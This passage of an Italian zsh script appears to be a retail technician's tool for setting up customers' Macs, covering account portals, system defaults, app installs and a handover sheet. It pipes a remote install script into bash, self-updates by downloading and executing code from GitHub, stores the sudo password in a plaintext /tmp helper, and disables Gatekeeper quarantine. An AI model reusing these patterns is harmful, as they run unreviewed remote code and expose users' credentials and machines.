        info "Apertura portale Riscatto Office (microsoft365.com/setup) a sinistra (proseguo senza attese)..."
        set_split_screen_mac "https://microsoft365.com/setup"
        ok "Portale Office pronto su $email_proton."
        add_report "Card Office 365 ($email_proton)" "OK"
    fi

    # 3. ATTIVAZIONE CARD MCAFEE ANTIVIRUS (SE SELEZIONATO)
    if [[ "$do_mcafee" == "true" ]]; then
        titolo "3. ATTIVAZIONE CARD MCAFEE ANTIVIRUS"
        print -r -- "   ${C_TXT}Dati per l'attivazione della licenza McAfee:${C_RST}"
        print -r -- "     ${C_CYAN}- Email Cliente  :${C_RST} $email_proton"
        print -r -- "     ${C_INFO}- Password       :${C_RST} $pass_gen"
        print -r -- ""

        echo -n "$email_proton" | pbcopy 2>/dev/null
        info "Apertura portale McAfee Activate (mcafee.com/activate) a sinistra (proseguo senza attese)..."
        set_split_screen_mac "https://www.mcafee.com/activate"
        ok "Portale McAfee pronto su $email_proton."
        add_report "Card McAfee ($email_proton)" "OK"
    fi

    # 4. ATTIVAZIONE CARD NORTON ANTIVIRUS (SE SELEZIONATO)
    if [[ "$do_norton" == "true" ]]; then
        titolo "4. ATTIVAZIONE CARD NORTON ANTIVIRUS"
        print -r -- "   ${C_TXT}Dati per l'attivazione della licenza Norton:${C_RST}"
        print -r -- "     ${C_CYAN}- Email Cliente  :${C_RST} $email_proton"
        print -r -- "     ${C_INFO}- Password       :${C_RST} $pass_gen"
        print -r -- ""

        echo -n "$email_proton" | pbcopy 2>/dev/null
        info "Apertura portale Norton Setup (norton.com/setup) a sinistra (proseguo senza attese)..."
        set_split_screen_mac "https://www.norton.com/setup"
        ok "Portale Norton pronto su $email_proton."
        add_report "Card Norton ($email_proton)" "OK"
    fi

    # 5. REGISTRAZIONE UNIEURO CYBER PROTECTION (SE SELEZIONATO)
    if [[ "$do_cyber" == "true" ]]; then
        local tel="${TELEFONO_CLIENTE:-}"
        titolo "5. REGISTRAZIONE UNIEURO CYBER PROTECTION (MAC)"
        print -r -- "   ${C_TXT}Dati cliente pronti per l'attivazione Cyber Protection:${C_RST}"
        print -r -- "     ${C_CYAN}- Nome / Cognome :${C_RST} $nome_c"
        print -r -- "     ${C_CYAN}- Email Creata   :${C_RST} $email_proton"
        print -r -- "     ${C_CYAN}- Cellulare      :${C_RST} ${tel:-Non specificato}"
        print -r -- "     ${C_INFO}- Password       :${C_RST} $pass_gen"
        print -r -- ""

        echo -n "$email_proton" | pbcopy 2>/dev/null
        info "Apertura portale Unieuro Cyber Protection in Safari a sinistra (proseguo senza attese)..."
        set_split_screen_mac "https://unieuro-cyber-protection.covercare.it"
        ok "Unieuro Cyber Protection pronto per $nome_c ($email_proton)."
        add_report "Unieuro Cyber Protection ($email_proton)" "OK"
    fi

    printf '\a'
    ok "Tutti gli account e le protezioni selezionate sono pronti: il setup prosegue in parallelo a piena velocita'!"
}

# Alias compatibilita'
invoke_ai_agent_mac() {
    invoke_auto_signup_mac "$@"
}

if [[ "$MODO" == "DIAGNOSTICA" ]]; then
  diagnostica_salute_mac
  exit 0
fi

# =============================================================================
# AVVIO AMBIENTE & SPLIT SCREEN
# =============================================================================
if $RUN_REALE; then
  if ! test_rete; then
    titolo "ATTENZIONE: Connessione Internet assente"
    errore "Il Mac non e' connesso a Internet. Collega il Wi-Fi per proseguire."
    print -r -- ""
    local tentativi_r=0
    while true; do
      ((tentativi_r++))
      beep_attesa; print -n -- "   Collega Internet e premi INVIO (o S = continua senza): "
      read -t 30 -r rnet || rnet="S"
      [[ "$rnet" == [Ss]* ]] && break
      test_rete && break
      [[ $tentativi_r -ge 3 ]] && break
    done
  fi
fi

# Dati iniziali: i veri arrivano dal pannello (una volta sola) mentre la fase 1
# lavora; servono solo dai passi manuali in poi.
NOME_CLIENTE="Utente"
CRED_ACCOUNT=""
CRED_PASSWORD=""
DATI_RICEVUTI=false
IS_CLT_MODE=false
PROFILO_APP=""

ordina_chiavetta_mac() {
    local dir="$1"
    [[ -z "$dir" || ! -d "$dir" || -d "$dir/.git" ]] && return 0
    local c
    for c in .agents .github docs pannello tests tools; do
        [[ -e "$dir/$c" ]] && rm -rf -- "$dir/$c" 2>/dev/null
    done
    local f
    for f in .gitattributes .gitignore AGENTS.md CHANGELOG.md CLAUDE.md LICENSE.md PARITA.md PSScriptAnalyzerSettings.psd1 README.md SECURITY.md "1 - AVVIA PER WINDOWS.bat" "2 - AVVIA PER MAC.command" "3 - ISTRUZIONI.txt"; do
        [[ -f "$dir/$f" ]] && rm -f -- "$dir/$f" 2>/dev/null
    done
    return 0
}

if $RUN_REALE && [[ -f "$0" ]]; then
    ordina_chiavetta_mac "$(cd "$(dirname "$0")" && pwd)"
fi

if $RUN_REALE && ! $NO_SELF_UPDATE && [[ -f "$0" ]]; then
    _loc_sha=$(shasum -a 256 "$0" 2>/dev/null | awk '{print $1}')
    _rem_sha=""
    _base_ok=""
    for _base in "https://raw.githubusercontent.com/samuelenigro97-prog/pc-facile/main" "https://cdn.jsdelivr.net/gh/samuelenigro97-prog/pc-facile@main"; do
        _rem_sha=$(curl -fsSL --max-time 4 -H "Cache-Control: no-cache" "${_base}/setup-mac.sh.sha256?t=$(date +%s)" 2>/dev/null | awk '{print $1}' | tr '[:upper:]' '[:lower:]')
        if [[ "$_rem_sha" =~ ^[0-9a-f]{64}$ ]]; then _base_ok="$_base"; break; fi
    done
    if [[ -n "$_base_ok" && -n "$_loc_sha" && "$_rem_sha" != "$_loc_sha" ]]; then
        info "Trovata versione piu' recente su GitHub: aggiorno e riavvio..."
        _tmp_mac="/tmp/setup-mac-updated-$$.sh"
        if curl -fsSL --max-time 15 -H "Cache-Control: no-cache" "${_base_ok}/setup-mac.sh?t=$(date +%s)" -o "$_tmp_mac" 2>/dev/null; then
            _dl_sha=$(shasum -a 256 "$_tmp_mac" 2>/dev/null | awk '{print $1}')
            if [[ "$_dl_sha" == "$_rem_sha" ]]; then
                [[ -w "$0" ]] && cp "$_tmp_mac" "$0" 2>/dev/null
                exec /bin/zsh "$_tmp_mac" --no-self-update "$@"
            fi
        fi
        rm -f "$_tmp_mac" 2>/dev/null
    fi
fi

if $RUN_REALE; then
    _MAC_SUDO_PASS=""
    _ASKPASS_FILE=""
    trap '[[ -n "$_ASKPASS_FILE" ]] && rm -f "$_ASKPASS_FILE" 2>/dev/null' EXIT INT TERM
    if ! sudo -n true 2>/dev/null; then
        print -r -- ""
        info "Inserisci la password del Mac (chiesta UNA sola volta per tutto il setup):"
        _tent_pw=0
        while (( _tent_pw < 3 )); do
            print -n -- "  Password Mac: "
            read -rs _MAC_SUDO_PASS
            print -r -- ""
            if printf '%s\n' "$_MAC_SUDO_PASS" | sudo -S -v </dev/null >/dev/null 2>&1; then
                break
            fi
            errore "Password errata, riprova."
            _MAC_SUDO_PASS=""
            (( _tent_pw++ ))
        done
    fi
    if [[ -n "$_MAC_SUDO_PASS" ]]; then
        _ASKPASS_FILE="/tmp/pcfacile-askpass-$$.sh"
        printf '#!/bin/sh\nprintf "%%s\\n" %s\n' "${(q)_MAC_SUDO_PASS}" > "$_ASKPASS_FILE"
        chmod 700 "$_ASKPASS_FILE"
        export SUDO_ASKPASS="$_ASKPASS_FILE"
        ( while true; do printf '%s\n' "$_MAC_SUDO_PASS" | sudo -S -v </dev/null >/dev/null 2>&1; sleep 45; kill -0 "$$" 2>/dev/null || exit; done ) &
    else
        ( while true; do sudo -n true 2>/dev/null; sleep 45; kill -0 "$$" 2>/dev/null || exit; done ) &
    fi
    open_pannello_mac "$NOME_CLIENTE" "$CRED_ACCOUNT" "$CRED_PASSWORD"
fi

# =============================================================================
# FASE 1: DATI CLIENTE & PASSI MANUALI (operatore)
# =============================================================================
printf '\033]0;PC Facile Mac - v%s\007' "$SCRIPT_VERSION"
print -r -- "\n  ${C_ORANGE:-}UNIEURO PC FACILE MAC${C_RESET:-} — ${C_BOLD:-}v$SCRIPT_VERSION${C_RESET:-}"
titolo "FASE 1 di 2 - Dati cliente e passi manuali (operatore)"
update_pannello_mac_status 10 "Dati cliente & Passi manuali" "Dati cliente, account e servizi..."
$RUN_REALE && attendi_credenziali_mac
if is_nome_generico_mac "$NOME_CLIENTE" || is_nome_generico_mac "$NOME_PROPRIO_CLIENTE"; then
    IS_CLT_MODE=true
    NOME_CLIENTE="Utente"
    NOME_PROPRIO_CLIENTE="Utente"
    CRED_ACCOUNT=""
    CRED_PASSWORD=""
elif ! $IS_CLT_MODE; then
    [[ -z "$CRED_ACCOUNT" || "$CRED_ACCOUNT" == "utente@icloud.com" ]] && CRED_ACCOUNT="$(email_cliente "$NOME_CLIENTE")"
    [[ -z "$CRED_PASSWORD" || "$CRED_PASSWORD" == "Utente123!" ]] && CRED_PASSWORD="$(password_cliente "$NOME_CLIENTE")"
fi

titolo "1. Nome del Mac"
if $RUN_REALE && [[ -n "$NOME_CLIENTE" ]]; then
    imposta_nome_mac "${NOME_PROPRIO_CLIENTE:-${NOME_CLIENTE##* }}"
fi

# Account e servizi indicati nel pannello (Proton, Office, antivirus, Cyber
# Protection): pagina giusta + dati pronti, conferma con INVIO.
invoke_auto_signup_mac "${NOME_CLIENTE:-Utente}"

# =============================================================================
# FASE 2: LINGUA, PROGRAMMI E AGGIORNAMENTI (automatico fino alla fine)
# =============================================================================
titolo "FASE 2 di 2 - Lingua, programmi e aggiornamenti (automatico)"
info "Fase 1 completata: ora la Fase 2 prosegue dritta in automatico fino alla fine."

# =============================================================================
# PASSO 1: LINGUA & REGIONE ITALIANA
# =============================================================================
update_pannello_mac_status 15 "Lingua e Regione" "Configurazione it-IT..."
titolo "1. Lingua e Regione (Italiano)"
if defaults read NSGlobalDomain AppleLocale 2>/dev/null | grep -qi 'it_IT'; then
    ok "macOS risulta gia' configurato in Italiano."
    add_report "Lingua italiana" "OK"
else
    if $RUN_REALE; then
        defaults write NSGlobalDomain AppleLanguages -array "it-IT" "en-IT" 2>/dev/null
        defaults write NSGlobalDomain AppleLocale -string "it_IT" 2>/dev/null
        ok "Lingua/regione impostate su Italiano."
        add_report "Lingua italiana" "OK"
    fi
fi

# =============================================================================
# PASSO 2: SINCRONIZZAZIONE ORA & NOME MAC
# =============================================================================
update_pannello_mac_status 25 "Sincronizzazione orario" "Orario di rete..."
titolo "2. Sincronizzazione orario"
if $RUN_REALE; then
    sudo systemsetup -setusingnetworktime on >/dev/null 2>&1
    sudo systemsetup -setnetworktimeserver time.apple.com >/dev/null 2>&1
    ok "Orario di rete attivo."
fi

# =============================================================================
# PASSO 3: SNAPSHOT DI RIPRISTINO APFS
# =============================================================================
update_pannello_mac_status 40 "Punto di Ripristino" "Creazione snapshot APFS..."
titolo "3. Snapshot APFS di Ripristino"
if $RUN_REALE; then
    if sudo tmutil localsnapshot >/dev/null 2>&1; then
        ok "Snapshot APFS creato con successo."
        add_report "Punto di ripristino APFS" "OK"
    else
        info "Snapshot APFS non disponibile (proseguo)."
        add_report "Punto di ripristino APFS" "SALTATO"
    fi
fi

# =============================================================================
# PASSO 4: OTTIMIZZAZIONE macOS (Defaults)
# =============================================================================
update_pannello_mac_status 50 "Ottimizzazione macOS" "Applicazione impostazioni Finder e Dock..."
titolo "4. Ottimizzazione macOS"
if $RUN_REALE; then
    defaults write NSGlobalDomain AppleShowAllExtensions -bool true 2>/dev/null
    defaults write com.apple.finder ShowPathbar -bool true 2>/dev/null
    defaults write com.apple.finder ShowStatusBar -bool true 2>/dev/null
    defaults write com.apple.finder FXPreferredViewStyle -string "Nlsv" 2>/dev/null
    defaults write com.apple.finder FXDefaultSearchScope -string "SCcf" 2>/dev/null
    defaults write com.apple.finder FXEnableExtensionChangeWarning -bool false 2>/dev/null
    defaults write com.apple.finder _FXSortFoldersFirst -bool true 2>/dev/null
    defaults write com.apple.finder _FXSortFoldersFirstOnDesktop -bool true 2>/dev/null
    # Evita creazione file spazzatura .DS_Store su chiavette USB e cartelle di rete
    defaults write com.apple.desktopservices DSDontWriteNetworkStores -bool true 2>/dev/null
    defaults write com.apple.desktopservices DSDontWriteUSBStores -bool true 2>/dev/null
    # Espandi automaticamente i pannelli Salva e Stampa di macOS e disattiva dialoghi pubblicitari
    defaults write NSGlobalDomain NSNavPanelExpandedStateForSaveMode -bool true 2>/dev/null
    defaults write NSGlobalDomain NSNavPanelExpandedStateForSaveMode2 -bool true 2>/dev/null
    defaults write NSGlobalDomain PMPrintingExpandedStateForPrint -bool true 2>/dev/null
    defaults write NSGlobalDomain PMPrintingExpandedStateForPrint2 -bool true 2>/dev/null
    defaults write com.apple.AdLib allowApplePersonalizedAdvertising -bool false 2>/dev/null
    defaults write com.apple.LaunchServices LSQuarantine -bool false 2>/dev/null
    defaults write com.apple.dock autohide -bool false 2>/dev/null
    defaults write com.apple.dock show-recents -bool false 2>/dev/null
    defaults write com.apple.dock mru-spaces -bool false 2>/dev/null
    # Auto-installazione estensione Browsing Protection by F-Secure su Chrome ed Edge
    defaults write com.google.Chrome ExtensionInstallForcelist -array "jmjjnhpacphpjmnnlnccpfmhkcloaade;https://clients2.google.com/service/update2/crx" 2>/dev/null || true
    defaults write com.microsoft.Edge ExtensionInstallForcelist -array "cpikpibllpjmpnchjajlibnmmomnnhnm;https://edge.microsoft.com/extensionwebstorebase/v1/crx" 2>/dev/null || true
    sudo mkdir -p "/Library/Application Support/Google/Chrome/External Extensions" 2>/dev/null || true
    printf '{"external_update_url": "https://clients2.google.com/service/update2/crx"}\n' | sudo tee "/Library/Application Support/Google/Chrome/External Extensions/jmjjnhpacphpjmnnlnccpfmhkcloaade.json" >/dev/null 2>&1 || true
    sudo chmod 644 "/Library/Application Support/Google/Chrome/External Extensions/jmjjnhpacphpjmnnlnccpfmhkcloaade.json" 2>/dev/null || true
    killall Finder Dock 2>/dev/null
    ok "Impostazioni e ottimizzazioni macOS applicate."
    add_report "Ottimizzazione macOS" "OK"
fi

# =============================================================================
# PASSO 5: ROSETTA 2 & HOMEBREW
# =============================================================================
update_pannello_mac_status 60 "Gestore Pacchetti" "Verifica Homebrew e Rosetta 2..."
titolo "5. Rosetta 2 & Gestore App (Homebrew)"
if [[ "$(uname -m)" == "arm64" ]] && $RUN_REALE; then
    if /usr/bin/pgrep -q oahd 2>/dev/null; then
        ok "Rosetta 2 presente."
    else
        info "Installazione Rosetta 2 per compatibilita' universale..."
        softwareupdate --install-rosetta --agree-to-license >/dev/null 2>&1
        ok "Rosetta 2 installata."
    fi
fi

if [[ -x "/opt/homebrew/bin/brew" ]]; then
    eval "$(/opt/homebrew/bin/brew shellenv 2>/dev/null)"
elif [[ -x "/usr/local/bin/brew" ]]; then
    eval "$(/usr/local/bin/brew shellenv 2>/dev/null)"
fi
if ! command -v brew >/dev/null 2>&1 && $RUN_REALE; then
    info "Installazione Homebrew..."
    NONINTERACTIVE=1 /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
    [[ -x "/opt/homebrew/bin/brew" ]] && eval "$(/opt/homebrew/bin/brew shellenv 2>/dev/null)"
    [[ -x "/usr/local/bin/brew" ]] && eval "$(/usr/local/bin/brew shellenv 2>/dev/null)"
fi
command -v brew >/dev/null 2>&1 && ok "Homebrew pronto."

# =============================================================================
# PASSO 6: INSTALLAZIONE APPLICAZIONI
# =============================================================================
update_pannello_mac_status 75 "Installazione App" "Download e installazione profilo..."
titolo "6. Installazione Applicazioni"
# Profilo dal pannello se i dati sono gia' arrivati, altrimenti BASE (la
# fase 1 non si ferma ad aspettare).
$RUN_REALE && ! $DATI_RICEVUTI && leggi_credenziali_salvate_mac
case "$PROFILO_APP" in UFFICIO|GAMING|NESSUNO) PROFILO="$PROFILO_APP";; *) PROFILO="BASE";; esac
[[ "${MODALITA_SETUP:-}" == "POSTVENDITA" ]] && PROFILO="NESSUNO"
info "Profilo app: $PROFILO"
if [[ "$PROFILO" == "NESSUNO" ]]; then
    info "Modalita' Post Vendita attiva: salto installazione Chrome/Applicazioni e riordino icone sulla Scrivania."
    add_report "Applicazioni" "SALTATO (Post Vendita)"
elif [[ -n "$PROFILO" ]] && $RUN_REALE; then
    for riga in "${CATALOGO[@]}"; do
        nome="${${(s:|:)riga}[1]}"; cask="${${(s:|:)riga}[2]}"; profili="${${(s:|:)riga}[3]}"
        if [[ " $profili " == *" $PROFILO "* ]]; then
            info "Installazione $nome in corso..."
            # 1. Tentativo di installazione offline diretta da memoria USB (.dmg/.pkg)
            if installa_offline_app_mac "$nome"; then
                ok "$nome installato con successo da cache offline USB!"
                INSTALLATE+=("$nome")
                continue
            fi

            # Gia' installata: salto (i passi gia' fatti non si rifanno).
            if [[ -d "/Applications/$nome.app" ]] || { command -v brew >/dev/null 2>&1 && brew list --cask "$cask" >/dev/null 2>&1; }; then
                ok "$nome gia' installato: salto."
                INSTALLATE+=("$nome")
                continue
            fi
            # 2. Fallback su Homebrew se connesso e offline non presente
            if command -v brew >/dev/null 2>&1; then
                _brew_err=""
                if _brew_err="$(brew install --cask "$cask" </dev/null 2>&1)"; then
                    # Rimuove flag quarantena Gatekeeper per evitare popup di conferma al primo avvio
                    xattr -d -r com.apple.quarantine "/Applications/$nome.app" 2>/dev/null || true
                    # Chiude eventuali splash screen avviati in automatico post-install
                    pkill -f -i "$nome" 2>/dev/null || true
                    ok "$nome installato tramite Homebrew."
                    INSTALLATE+=("$nome")
                else
                    _brew_last="${${(f)_brew_err}[-1]:-errore rete/cask}"
                    info "$nome non installato via Homebrew ($_brew_last): proseguo."
                fi
            fi
        fi
    done
    # Pulizia popup residui noti
    pkill -f -i "Spotify" 2>/dev/null || true
    pkill -f -i "Discord" 2>/dev/null || true
    pkill -f -i "Zoom" 2>/dev/null || true
    pkill -f -i "Steam" 2>/dev/null || true

    # Crea app bundle nativa per Unieuro Cyber Protection e ordina i collegamenti sul Desktop
    # (PRIME DUE APP: 1. Unieuro Secure, 2. Unieuro Cyber Protection -> poi Office -> Browser/Chat -> Multimedia)
    if [[ -d "$HOME/Desktop" ]]; then
        if $RUN_REALE && ! $MODO_TEST; then
            local _cp_app="/Applications/Unieuro Cyber Protection.app"
            sudo mkdir -p "$_cp_app/Contents/MacOS" 2>/dev/null || true
            printf '#!/bin/sh\nopen "https://unieuro-cyber-protection.covercare.it"\n' | sudo tee "$_cp_app/Contents/MacOS/UnieuroCyberProtection" >/dev/null 2>&1 || true
            sudo chmod +x "$_cp_app/Contents/MacOS/UnieuroCyberProtection" 2>/dev/null || true
            printf '<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">\n<plist version="1.0"><dict><key>CFBundleExecutable</key><string>UnieuroCyberProtection</string><key>CFBundleIdentifier</key><string>it.unieuro.cyberprotection</string><key>CFBundleName</key><string>Unieuro Cyber Protection</string><key>CFBundlePackageType</key><string>APPL</string></dict></plist>\n' | sudo tee "$_cp_app/Contents/Info.plist" >/dev/null 2>&1 || true
        fi
        local _app_bundle _app_match
        for _app_match in \
            "Unieuro Secure.app" \
            "Unieuro Cyber Protection.app" \
            "Microsoft Word.app" \
            "Microsoft Excel.app" \
            "Microsoft PowerPoint.app" \
            "Microsoft Outlook.app" \
            "Microsoft OneNote.app" \
            "LibreOffice.app" \
            "Adobe Acrobat Reader.app" \
            "Adobe Acrobat.app" \
            "Google Chrome.app" \
            "zoom.us.app" \
            "WhatsApp.app" \
            "Discord.app" \
            "AnyDesk.app" \
            "TeamViewer.app" \
            "Spotify.app" \
            "VLC.app" \
            "The Unarchiver.app" \
            "Steam.app"; do
            _app_bundle="/Applications/$_app_match"
            if [[ -d "$_app_bundle" ]]; then
                [[ -L "$HOME/Desktop/$_app_match" ]] && rm -f "$HOME/Desktop/$_app_match" 2>/dev/null
                if [[ ! -e "$HOME/Desktop/$_app_match" ]]; then
                    ln -s "$_app_bundle" "$HOME/Desktop/$_app_match" 2>/dev/null || true
                fi
            fi
        done
        ok "Collegamenti app ordinati sulla Scrivania (1. Unieuro Secure, 2. Unieuro Cyber Protection -> Office -> Web -> Multimedia)."
    fi

    add_report "App profilo $PROFILO (${#INSTALLATE} installate)" "OK"
fi

# =============================================================================
# PASSO 7: AGGIORNAMENTI (app Homebrew e macOS)
# =============================================================================
titolo "7. Aggiornamenti app (Homebrew) e macOS"
update_pannello_mac_status 80 "Aggiornamenti" "App (Homebrew) e macOS..."
if [[ "${MODALITA_SETUP:-}" == "POSTVENDITA" || "$PROFILO" == "NESSUNO" ]]; then
    info "Modalita' Post Vendita attiva: salto aggiornamenti lunghi Homebrew/macOS per consegna rapida."
    add_report "Aggiornamenti macOS" "SALTATO (Post Vendita)"
elif $RUN_REALE; then
    if command -v brew >/dev/null 2>&1; then
        info "Aggiorno le app installate con Homebrew..."
        brew upgrade </dev/null >/dev/null 2>&1 && ok "App aggiornate." || info "Aggiornamento app non completato (proseguo)."
    fi
    info "Attivo gli aggiornamenti automatici di macOS e scarico gli aggiornamenti disponibili (max 90s)..."
    sudo -n defaults write /Library/Preferences/com.apple.SoftwareUpdate AutomaticCheckEnabled -bool true 2>/dev/null || true
    sudo -n defaults write /Library/Preferences/com.apple.SoftwareUpdate AutomaticDownload -bool true 2>/dev/null || true
    sudo -n defaults write /Library/Preferences/com.apple.SoftwareUpdate AutomaticallyInstallMacOSUpdates -bool true 2>/dev/null || true
    sudo -n defaults write /Library/Preferences/com.apple.SoftwareUpdate CriticalUpdateInstall -bool true 2>/dev/null || true
    sudo -n defaults write /Library/Preferences/com.apple.SoftwareUpdate ConfigDataInstall -bool true 2>/dev/null || true
    sudo -n softwareupdate --download --all </dev/null >/dev/null 2>&1 &
    _su_pid=$!
    _su_ok=false
    for _su_i in {1..18}; do
        if ! kill -0 "$_su_pid" 2>/dev/null; then
            wait "$_su_pid" 2>/dev/null && _su_ok=true
            break
        fi
        sleep 5
        info "Download aggiornamenti macOS in corso... ($((_su_i * 5))s / max 90s)"
    done
    if kill -0 "$_su_pid" 2>/dev/null; then
        kill "$_su_pid" 2>/dev/null || true
        info "Aggiornamenti macOS lasciati in background (continua da Impostazioni di Sistema)."
        add_report "Aggiornamenti macOS" "AVVISO (background)"
    elif $_su_ok; then
        ok "Aggiornamenti macOS scaricati."
        add_report "Aggiornamenti macOS (scaricati)" "OK"
    else
        info "Nessun aggiornamento macOS scaricato (gia' aggiornato o richiede auth in Impostazioni)."
        add_report "Aggiornamenti macOS" "AVVISO"
    fi
fi

# =============================================================================
# PASSO 8: FILEVAULT & DIAGNOSTICA
# =============================================================================
$RUN_REALE && leggi_credenziali_salvate_mac
update_pannello_mac_status 95 "FileVault & Scheda Consegna" "Generazione scheda cliente..."
titolo "8. Sicurezza FileVault & Scheda Consegna"
FV_KEY=""
if $RUN_REALE; then
    FV_STATO="$(fdesetup status 2>/dev/null)"
    if echo "$FV_STATO" | grep -q "On"; then
        ok "FileVault attivo."
    fi
fi

# Genera Scheda Consegna Mac HTML sul Desktop (solo in Configurazione Completa)
if [[ "${MODALITA_SETUP:-}" == "POSTVENDITA" || "$PROFILO" == "NESSUNO" ]]; then
    info "Modalita' Post Vendita attiva: salto generazione Scheda-Consegna-Cliente.pdf sulla Scrivania."
else
DESKTOP="$HOME/Desktop"
HTML_CONSEGNA="$DESKTOP/Scheda-Consegna-Mac.html"
hw="$(get_hw_info_mac)"
hw_m="${${(s:|:)hw}[1]}"
hw_c="${${(s:|:)hw}[2]}"
hw_r="${${(s:|:)hw}[3]}"
hw_s="${${(s:|:)hw}[4]}"

batt="$(get_battery_info_mac)"
batt_desc="${${(s:|:)batt}[2]} - ${${(s:|:)batt}[3]}"

# Valori escapati per la scheda HTML (nome, credenziali e dati hardware)
h_nome="$(html_esc "$NOME_CLIENTE")"; h_account="$(html_esc "$CRED_ACCOUNT")"; h_password="$(html_esc "$CRED_PASSWORD")"; h_pass_secure="$(html_esc "$PASS_SECURE")"
hw_m="$(html_esc "$hw_m")"; hw_c="$(html_esc "$hw_c")"; hw_r="$(html_esc "$hw_r")"; hw_s="$(html_esc "$hw_s")"
batt_desc="$(html_esc "$batt_desc")"

app_badges=""
for a in "${INSTALLATE[@]}"; do
    app_badges+="<div style='background:#fff; border:1px solid #cbd5e1; border-radius:6px; padding:4px 8px; font-size:11.5px; display:inline-block; margin:3px;'>&#10003; <strong>$(html_esc "$a")</strong></div>"
done
[[ -z "$app_badges" ]] && app_badges="<div style='background:#fff; border:1px solid #cbd5e1; border-radius:6px; padding:4px 8px; font-size:11.5px;'>&#10003; <strong>Applicazioni base configurate</strong></div>"

is_clt=$IS_CLT_MODE
if [[ "${NOME_CLIENTE:l}" == "clt clt" || "${NOME_CLIENTE:l}" == "clt" || ("${NOME_PROPRIO_CLIENTE:l}" == "clt") ]]; then
    is_clt=true
fi

box_cred=""
if { ! $is_clt && [[ -n "$h_account" || -n "$h_password" ]]; } || [[ -n "$h_pass_secure" ]]; then
    riga_pass_mac=""
    if ! $is_clt && [[ -n "$h_password" ]]; then
        riga_pass_mac="<p><strong>Password provvisoria:</strong> <code style=\"background:#fee2e2; padding:2px 6px; border-radius:4px; color:#991b1b; font-weight:bold;\">$h_password</code></p>"
    fi
    riga_secure_mac=""
    if [[ -n "$h_pass_secure" ]]; then
        riga_secure_mac="<p><strong>Password Unieuro Secure:</strong> <code style=\"background:#ffedd5; padding:2px 6px; border-radius:4px; color:#c2410c; font-weight:bold;\">$h_pass_secure</code></p>"
    fi
    box_cred="<div class=\"card card-cred\">
                <h3 style=\"color:#EE7203; margin-bottom:8px;\">🔑 Credenziali &amp; Account</h3>
                <p><strong>Email / Account:</strong> $h_account</p>
                $riga_pass_mac
                $riga_secure_mac
            </div>"
fi

cat <<EOF > "$HTML_CONSEGNA"
<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <title>Scheda Consegna Apple Mac - $h_nome</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; }
        body { background: #f1f5f9; color: #1e293b; padding: 24px; font-size: 13px; line-height: 1.5; }
        .sheet { max-width: 820px; margin: 0 auto; background: #fff; border-radius: 12px; box-shadow: 0 4px 16px rgba(0,0,0,0.08); overflow: hidden; border: 1px solid #e2e8f0; }
        .header { background: linear-gradient(135deg, #00122B 0%, #002B5C 100%); color: #fff; padding: 22px 28px; border-bottom: 4px solid #EE7203; display: flex; justify-content: space-between; align-items: center; }
        .card { background: #f8fafc; border: 1px solid #e2e8f0; border-radius: 8px; padding: 16px; margin-bottom: 12px; }
        .card-cred { background: #fffaf5; border: 1.5px solid #EE7203; }
        .btn-print { background: #EE7203; color: #fff; border: none; font-weight: 700; font-size: 13px; padding: 8px 18px; border-radius: 6px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="sheet">
        <div class="header">
            <div>
                <h1 style="font-size:20px;">🍎 Scheda di Consegna Apple Mac</h1>
                <p style="font-size:12px; color:#cbd5e1;">Assistenza Tecnica Unieuro &bull; Batte. Forte. Sempre.</p>
            </div>
            <div style="background:#EE7203; padding:6px 12px; border-radius:6px; font-weight:700;">PC FACILE MAC v$SCRIPT_VERSION</div>
        </div>
        <div style="padding: 24px;">
            $box_cred
            <div class="card">
                <h3 style="margin-bottom:8px; color:#00122B;">💻 Dati Dispositivo &amp; Diagnostica</h3>
                <p><strong>Modello:</strong> $hw_m ($hw_c &bull; $hw_r)</p>
                <p><strong>Seriale (S/N):</strong> $hw_s</p>
                <p><strong>Batteria:</strong> $batt_desc</p>
                <p><strong>Data Setup:</strong> $(date '+%d/%m/%Y %H:%M')</p>
            </div>
            <div class="card">
                <h3 style="margin-bottom:8px; color:#00122B;">📦 Applicazioni Installate</h3>
                $app_badges
            </div>
            <div style="text-align:right; margin-top:14px;">
                <button class="btn-print" onclick="window.print()">🖨️ Stampa Scheda Cliente</button>
            </div>
        </div>
    </div>
</body>
</html>
EOF

ok "Scheda di consegna HTML creata: $HTML_CONSEGNA"
PDF_CONSEGNA="$DESKTOP/Scheda-Consegna-Cliente.pdf"
if $RUN_REALE && ! $MODO_TEST; then
    _chrome_bin=""
    if [[ -x "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome" ]]; then
        _chrome_bin="/Applications/Google Chrome.app/Contents/MacOS/Google Chrome"
    elif [[ -x "/Applications/Microsoft Edge.app/Contents/MacOS/Microsoft Edge" ]]; then
        _chrome_bin="/Applications/Microsoft Edge.app/Contents/MacOS/Microsoft Edge"
    fi
    if [[ -n "$_chrome_bin" ]]; then
        "$_chrome_bin" --headless --disable-gpu --no-pdf-header-footer --print-to-pdf="$PDF_CONSEGNA" "file://$HTML_CONSEGNA" >/dev/null 2>&1 || true
        if [[ -s "$PDF_CONSEGNA" ]]; then
            rm -f -- "$HTML_CONSEGNA" 2>/dev/null || true
            ok "Scheda di consegna PDF generata sulla Scrivania: $PDF_CONSEGNA"
        fi
    fi
fi
fi
update_pannello_mac_status 100 "Configurazione Mac Completata!" "Tutti i lavori terminati con successo" true

# Pulizia file temporanei con credenziali in chiaro: pannello generato in /tmp
# (email e password precompilate) ed eventuale JSON salvato dal pannello.
# La pagina gia' aperta nel browser resta visibile. Prima del menu di riavvio.
rm -f -- /tmp/Pannello-Operatore-Mac.html "$HOME/Downloads/pcfacile-cred.json" "${TMPDIR:-/tmp}/pcfacile-cred.json" 2>/dev/null

# =============================================================================
# MENU DI CHIUSURA: CHECK SALUTE MAC O RIAVVIO
# =============================================================================
if $RUN_REALE && ! $MODO_TEST; then
    titolo "COMPLETAMENTO PC FACILE (MAC)"
    print -r -- "${C_OK}   Tutti i lavori di setup Mac sono terminati con successo!${C_RST}"
    print -r -- ""
    ok "TUTTE LE PROCEDURE SONO TERMINATE: CONFIGURAZIONE COMPLETATA AL 100%!"
